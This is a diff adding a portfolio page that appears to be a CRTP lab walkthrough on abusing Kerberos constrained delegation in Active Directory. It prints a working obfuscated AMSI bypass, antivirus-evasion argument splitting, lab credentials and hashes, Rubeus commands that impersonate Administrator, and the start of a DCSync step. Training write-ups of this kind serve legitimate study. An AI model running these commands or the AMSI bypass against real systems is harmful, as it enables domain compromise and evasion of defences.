@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Constrained Delegation - CRTP</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .project-sidebar { padding: 20px; }
+    .project-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .project-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .project-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .project-sidebar a { 
+      display: block; 
+      padding: 8px 12px; 
+      margin: 4px 0; 
+      color: #d6d6d6; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      transition: all 0.2s; 
+    }
+    .project-sidebar a:hover { 
+      background: #2a2a2a; 
+      color: #ffdb70; 
+    }
+    .project-sidebar a.active { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+      font-weight: 600; 
+    }
+    
+    .notion-content { 
+      line-height: 1.6; 
+    }
+    .notion-content img { 
+      max-width: 100%; 
+      height: auto; 
+      margin: 20px 0; 
+      border-radius: 8px; 
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .notion-content h1 { 
+      font-size: 1.8rem; 
+      margin: 30px 0 20px; 
+      color: #fafafa; 
+    }
+    .notion-content h2 { 
+      font-size: 1.5rem; 
+      margin: 25px 0 15px; 
+      color: #fafafa; 
+    }
+    .notion-content h3 { 
+      font-size: 1.3rem; 
+      margin: 20px 0 10px; 
+      color: #fafafa; 
+    }
+    .notion-content p { 
+      margin: 15px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content ul, .notion-content ol { 
+      margin: 15px 0; 
+      padding-left: 30px; 
+    }
+    .notion-content li { 
+      margin: 5px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content code { 
+      background: #2a2a2a; 
+      padding: 2px 6px; 
+      border-radius: 4px; 
+      font-family: 'Courier New', monospace; 
+      color: #ffdb70; 
+    }
+    .notion-content pre { 
+      background: #1e1e1e; 
+      border-left: 4px solid #ffdb70; 
+      padding: 15px; 
+      margin: 20px 0; 
+      border-radius: 0 8px 8px 0; 
+      overflow-x: auto; 
+    }
+    .notion-content a { 
+      color: #ffdb70; 
+      text-decoration: underline; 
+    }
+    .notion-content strong { 
+      color: #fafafa; 
+      font-weight: 600; 
+    }
+    .notion-content em { 
+      font-style: italic; 
+    }
+    .notion-content figure { 
+      margin: 20px 0; 
+    }
+    .notion-content figcaption { 
+      display: none; 
+    }
+    .main-content { 
+      max-width: 100% !important; 
+    }
+    .about { 
+      max-width: 100% !important; 
+      padding: 20px 40px !important; 
+    }
+    /* Critical: Code Block Formatting */
+    pre code {
+      white-space: pre;
+      word-break: normal;
+      overflow-x: auto;
+      display: block;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Walkthrough</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="project-sidebar">
+          <a href="../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+           <a href="part-01.html">1. PowerShell Detection & Bypass</a>
+           <a href="part-02.html">2. Enumeration Tools</a>
+           <a href="part-03.html">3. Domain Enumeration Techniques</a>
+           <a href="part-04.html">4. Privilege Escalation (Derivative Local Admin)</a>
+           <a href="part-05.html">5. Golden Ticket</a>
+           <a href="part-06.html">6. Silver Ticket & WMI Abuse</a>
+           <a href="part-07.html">7. Diamond Ticket</a>
+           <a href="part-08.html">8. DCSync Attack</a>
+           <a href="part-09.html">9. AS-REP Roasting</a>
+           <a href="part-10.html">10. Unconstrained Delegation + Printer Bug</a>
+           <a href="part-11.html">11. Constrained Delegation</a>
+           <a href="part-12.html">12. Resource-Based Constrained Delegation (RBCD)</a>
+           <a href="part-13.html">13. Trust Enumeration & Abuse</a>
+           <a href="part-14.html">14. Cross-Forest Trust Attacks</a>
+           <a href="part-15.html">15. ADCS Attacks (ESC1, ESC3)</a>
+           <a href="part-16.html">16. Tools Transfer & Execution</a>
+           <a href="part-17.html">17. ASR Rules Bypass (Lateral Movement)</a>
+        </div>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Constrained Delegation</header>
+        <section class="about-text notion-content">
+          <h1>Abusing Constrained Delegation with User Accounts</h1></div><div style="display:contents" dir="auto"><h2 id="30c79e9a-d7c9-807c-9855-d5ad397f56b1" class="">Enumeration</h2></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806a-b1f0-e10e6938cf41" class="">To enumerate User accounts with Delegation Rights assigned, Powerview.ps1 can be used.<br/>Assuming that we do have AV enabled on the machine or network, let’s run InvisiShell bypass script blocking mechanisms and bypass AMSI as well.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8057-b994-de8b2643a748" class=""><code>RunWithRegistryNonAdmin.bat</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80e9-b14a-e86ccac07113" class="image"><a href="images/screenshot_011.png"><img style="width:1233px" src="images/screenshot_011.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8081-80b8-e256da19a8cd" class="">AMSI Bypass</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-800f-8f9e-c2a810e4b8bb" class="code code-wrap"><code class="language-PowerShell">S`eT-It`em ( &#x27;V&#x27;+&#x27;aR&#x27; + &#x27;IA&#x27; + (&#x27;blE:1&#x27;+&#x27;q2&#x27;) + (&#x27;uZ&#x27;+&#x27;x&#x27;) ) ([TYpE]( &quot;{1}{0}&quot;-F&#x27;F&#x27;,&#x27;rE&#x27; ) ) ; ( Get-varI`A`BLE ((&#x27;1Q&#x27;+&#x27;2U&#x27;) +&#x27;zX&#x27; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#x27;Uti&#x27;+&#x27;l&#x27;),&#x27;A&#x27;,(&#x27;Am&#x27;+&#x27;si&#x27;),(&#x27;.Man&#x27;+&#x27;age&#x27;+&#x27;men&#x27;+&#x27;t.&#x27;),(&#x27;u&#x27;+&#x27;to&#x27;+&#x27;mation.&#x27;),&#x27;s&#x27;,(&#x27;Syst&#x27;+&#x27;em&#x27;) ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f(&#x27;a&#x27;+&#x27;msi&#x27;),&#x27;d&#x27;,(&#x27;I&#x27;+&#x27;nitF&#x27;+&#x27;aile&#x27;) ),( &quot;{2}{4}{0}{1}{3}&quot; -f(&#x27;S&#x27;+&#x27;tat&#x27;),&#x27;i&#x27;,(&#x27;Non&#x27;+&#x27;Publ&#x27;+&#x27;i&#x27;),&#x27;c&#x27;,&#x27;c,&#x27; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ea-b43e-d912829ba41d" class="">Enumerating Constrained delegation using PowerView.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8074-88f0-d5828b484336" class=""><code>. .\PowerView.ps1</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b0-b334-e892338047f0" class=""><code>Get-DomainUser -TrustedToAuth</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8067-838b-d7b7123d55af" class="image"><a href="images/screenshot_012.png"><img style="width:1233px" src="images/screenshot_012.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a2-8edb-ffe39879e3b6" class="">The output from the <code>Get-DomainUser</code> command in PowerView, specifically with the <code>-TrustedToTauth</code> parameter, provides information about the users who have been granted Constrained Delegation (CD) rights. Here&#x27;s a breakdown of the output:</p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8065-828b-dfccece6e1ae" class="bulleted-list"><li style="list-style-type:disc"><strong>UserPrincipalName</strong>: This is the username in the format <code>websvc</code>.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8072-b810-f2d0a9bcd98d" class="bulleted-list"><li style="list-style-type:disc"><strong>msds-allowedtodelegateto</strong>: This field lists the services or computers that the user is allowed to delegate to. In this case, the user <code>websvc</code> is allowed to delegate to two services: <code>CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL</code> and <code>CIFS/dcorp-mssql</code>. These are likely SQL Server services.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-808c-b398-c2c3225dbc2b" class="bulleted-list"><li style="list-style-type:disc"><strong>UserAccountControl</strong>: This field provides additional information about the user&#x27;s account settings. In this case, the user <code>websvc</code> has the following settings:<div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80a5-ab02-c60410de30a7" class="bulleted-list"><li style="list-style-type:circle"><strong>NORMAL_ACCOUNT</strong>: The user is a normal user account.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80db-8b3e-d21e6c90b5dd" class="bulleted-list"><li style="list-style-type:circle"><strong>DONT_EXPIRE_PASSWORD</strong>: The user&#x27;s password does not expire.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8076-9307-ce320409b45b" class="bulleted-list"><li style="list-style-type:circle"><strong>TRUSTED_TO_AUTH_FOR_DELEGATION</strong>: The user has been granted Constrained Delegation rights, which allows them to impersonate other users or services for specific tasks.</li></ul></div></li></ul></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8057-b6e0-f09b74f960f8" class="">In summary, the output indicates that the user <code>websvc</code> has been granted Constrained Delegation rights, allowing them to delegate to specific services like SQL Server.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f6-8f5c-fa5faba929f8" class="">For this attack we can user KEKEO or RUBEUS.</p></div><div style="display:contents" dir="auto"><h2 id="30c79e9a-d7c9-802f-8cea-d7c53bce01f8" class="">Constrained Delegation With Rubeus.</h2></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808c-8aa8-c9c37acf8fea" class="">Let’s assume that we have compromised WEBSVC user credentials like NTLM or AES256 key before, we can abuse the Constrained Delegation assigned to this user.<br/>Note: I’ll be using AES256 key, since it’s more stealthy.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804a-9d69-e2cbd9883bfa" class=""><code>Username : websvc</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8034-a7c2-e3eefb73ab53" class=""><code>Password : AServicewhichIsNotM3@nttoBe</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8069-b7a4-cb3ed20e420c" class=""><code>aes256_hmac:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7</code></p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-806c-ab5e-d445c880be21" class="">Using PELoader.exe for args encoding.</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8072-8e15-cf82110e9c37" class="">Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808b-b29d-ce6a1eba925c" class="">ArgSpli.bat</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ed-b4e8-c06ad5415bea" class=""><code>s4u</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8071-9696-e950376dc6e6" class="code code-wrap"><code class="language-PowerShell">set &quot;z=u&quot;
+set &quot;y=4&quot;
+set &quot;x=s&quot;
+set &quot;Pwn=%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8028-abd8-ff3cd86d6aa7" class="">Now we can execute the Rubeus payload.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8091-a962-ddb90e6f5fca" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:&quot;CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL&quot; /ptt</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8088-a54e-ff4638c6fbc7" class="image"><a href="images/screenshot_013.png"><img style="width:1233px" src="images/screenshot_013.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8067-8cdb-d25bebe88e36" class="">Here&#x27;s a breakdown of the command:</p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80b4-b90a-f05776077aaf" class="bulleted-list"><li style="list-style-type:disc"><code><strong>Loader.exe</strong></code>: This is a tool used to load and execute other tools, such as Rubeus.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8061-8196-e27a99049d26" class="bulleted-list"><li style="list-style-type:disc"><code><strong>path</strong></code>: Specifies the path to the Rubeus executable.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-809d-9495-f99a0921cf8a" class="bulleted-list"><li style="list-style-type:disc"><code><strong>args</strong></code>: Specifies the arguments to be passed to Rubeus.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80db-98d7-df91493d2fb1" class="bulleted-list"><li style="list-style-type:disc"><code><strong>%Pwn%</strong></code>: This is a placeholder for the command to be executed.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80e6-aad3-fd6e7085e191" class="bulleted-list"><li style="list-style-type:disc"><code><strong>/user:websvc</strong></code>: Specifies the user to impersonate (<code>websvc</code>).</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-800b-ac84-c695d95e5fbb" class="bulleted-list"><li style="list-style-type:disc"><code><strong>/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7</strong></code>: Specifies the AES256 hash for the user <code>websvc</code>.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8046-9793-e631eee8a495" class="bulleted-list"><li style="list-style-type:disc"><code><strong>/impersonateuser:Administrator</strong></code>: Specifies the user to impersonate (<code>Administrator</code>).</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8018-9b7c-eef5e555f4ee" class="bulleted-list"><li style="list-style-type:disc"><code><strong>/msdsspn:&quot;CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL&quot;</strong></code>: Specifies the service to impersonate (<code>CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL</code>).</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8043-9481-cb29206b00fa" class="bulleted-list"><li style="list-style-type:disc"><code><strong>/ptt</strong></code>: This flag tells Rubeus to use the obtained TGS to access the service.</li></ul></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c2-9743-d5c2667e9e8e" class="">This command will request a TGS for the domain administrator account using the <code>websvc</code> user&#x27;s credentials and then use that TGS to access the <code>CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL</code> service as the domain administrator.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8020-9600-c6f6c90d0df7" class="">Now let’s see if the ticket has been injected into our Cached Tickets as Administrator.<br/><code>klist</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-803d-a40c-cb391c9acef6" class="image"><a href="images/screenshot_014.png"><img style="width:1233px" src="images/screenshot_014.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b2-ba87-d69c744ebeb4" class="">Above we can see that we have it into our Cached Tickets as Administrator.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8015-8e52-d5e7ec4aa8f1" class=""><code>dir \\dcorp-mssql.dollarcorp.moneycorp.local\C$</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-804c-9d85-f727ecb231f2" class="image"><a href="images/screenshot_015.png"><img style="width:1233px" src="images/screenshot_015.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e3-aab2-c3851b9ee884" class="">Above we can see that we were able to abuse the Constrained Delegation assigned to user websvc into DCORP-MSSQL.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto">
+<h1>Abusing Constrained Delegation with Computer accounts</h1></div><div style="display:contents" dir="auto"><h2 id="30c79e9a-d7c9-8046-9576-c0b548d2258d" class="">Enumeration</h2></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807d-bc2f-d3da91bb6c2f" class="">To enumerate User accounts with Delegation Rights assigned, Powerview.ps1 can be used.<br/>Assuming that we do have AV enabled on the machine or network, let’s run InvisiShell bypass script blocking mechanisms and bypass AMSI as well.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8068-8f37-ff6ed8f26cc3" class=""><code>RunWithRegistryNonAdmin.bat</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8082-ab21-e34e149fde0d" class="image"><a href="images/screenshot_011.png"><img style="width:1233px" src="images/screenshot_011.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8053-bf20-fa72e69eeb0b" class="">AMSI Bypass</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80f0-ab52-dc09008c5b8a" class="code code-wrap"><code class="language-PowerShell">S`eT-It`em ( &#x27;V&#x27;+&#x27;aR&#x27; + &#x27;IA&#x27; + (&#x27;blE:1&#x27;+&#x27;q2&#x27;) + (&#x27;uZ&#x27;+&#x27;x&#x27;) ) ([TYpE]( &quot;{1}{0}&quot;-F&#x27;F&#x27;,&#x27;rE&#x27; ) ) ; ( Get-varI`A`BLE ((&#x27;1Q&#x27;+&#x27;2U&#x27;) +&#x27;zX&#x27; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#x27;Uti&#x27;+&#x27;l&#x27;),&#x27;A&#x27;,(&#x27;Am&#x27;+&#x27;si&#x27;),(&#x27;.Man&#x27;+&#x27;age&#x27;+&#x27;men&#x27;+&#x27;t.&#x27;),(&#x27;u&#x27;+&#x27;to&#x27;+&#x27;mation.&#x27;),&#x27;s&#x27;,(&#x27;Syst&#x27;+&#x27;em&#x27;) ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f(&#x27;a&#x27;+&#x27;msi&#x27;),&#x27;d&#x27;,(&#x27;I&#x27;+&#x27;nitF&#x27;+&#x27;aile&#x27;) ),( &quot;{2}{4}{0}{1}{3}&quot; -f(&#x27;S&#x27;+&#x27;tat&#x27;),&#x27;i&#x27;,(&#x27;Non&#x27;+&#x27;Publ&#x27;+&#x27;i&#x27;),&#x27;c&#x27;,&#x27;c,&#x27; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ca-bde1-c84334d9074e" class="">Enumerating Constrained delegation using PowerView.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8081-98b2-c1b15ea330d2" class=""><code>. .\PowerView.ps1</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8026-9bc9-e8c39c1658bf" class=""><code>Get-DomainComputer -TrustedToAuth</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-807a-9142-dffd2c927dd0" class="image"><a href="images/screenshot_017.png"><img style="width:1233px" src="images/screenshot_017.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8090-81d0-e0c7228b87c1" class="">The provided output is from the <code>Get-DomainComputer</code> command in PowerView, which is used to enumerate domain computers. <br/>Here&#x27;s a breakdown of the output:</p></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8090-8da3-e53b7c10fd60" class="numbered-list" start="1"><li><strong>samaccountname</strong>: This is the SAM account name of the computer, which is <code>DCORP-ADMINSRV$</code>.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80b9-8efd-dfeca7632413" class="numbered-list" start="2"><li><strong>samaccounttype</strong>: This indicates the type of account. In this case, it is a machine account (<code>MACHINE_ACCOUNT</code>).</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8040-82aa-eb26a53d8a35" class="numbered-list" start="3"><li><strong>useraccountcontrol</strong>: This is a bit mask that defines the user account properties. In this case, it includes <code>WORKSTATION_TRUST_ACCOUNT</code> and <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>. These flags indicate that the computer is a workstation and is trusted to authenticate for delegation.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80df-b6d8-cd8a6063da6b" class="numbered-list" start="4"><li><strong>msds-allowedtodelegateto</strong>: This is a list of trusted computers that this computer is allowed to delegate to. In this case, it includes <code>TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL</code> and <code>TIME/dcorp-DC</code>. These are the domain controllers that this computer is allowed to delegate to.</li></ol></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8055-a577-d9375bedaad5" class="">Let’s assume that we have compromised <code>DCORP-ADMINSRV$</code> computer account credentials and we will use it to abuse this Constrained Delegation.<br/>Note: I’ll be using AES256 key since it’s more stealthy, but NTLM has could also be used.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8088-b65a-d9713bf25618" class=""><code>ComputerName: dcorp-adminsrv$</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806d-8b3b-eb3decdd4dfa" class=""><code>NTLM:b5f451985fd34d58d5120816d31b5565</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80df-88bc-cae78436240a" class=""><code>aes256_hmac:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</code></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80dd-87d5-d3e9ce459d6a" class="">Using PELoader.exe for args encoding.</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801e-89b4-e9e0febea880" class="">Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8078-a80a-c50a9cc10378" class="">ArgSpli.bat</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-809f-9403-cc85ea29911c" class=""><code>s4u</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80b5-952c-eda36ea48cc4" class="code code-wrap"><code class="language-PowerShell">set &quot;z=u&quot;
+set &quot;y=4&quot;
+set &quot;x=s&quot;
+set &quot;Pwn=%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8091-8d30-cae0a143bc5f" class="">Now we can execute the Rubeus payload.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8088-babd-f598269dc0fb" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.local /altservice:ldap /ptt</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80e1-aea4-c0844e9b8c8a" class="image"><a href="images/screenshot_018.png"><img style="width:1233px" src="images/screenshot_018.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801c-89aa-d465c199f62a" class="">Let’s check if the ticket has been imported into our Cached Tickets.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d1-b311-d069ae9eb853" class=""><code>klist</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80a1-be28-fcde6cb8b328" class="image"><a href="images/screenshot_019.png"><img style="width:1233px" src="images/screenshot_019.png"/></a></figure></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8069-9b58-d8a7bb484c23" class="">Now we can use SafetyKatz to DCSync.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805d-ad6c-f9d54adda375" class="">ArgSplit.bat</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8042-a25c-f8f702cb9229" class=""><code>lsadump::dcsync</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 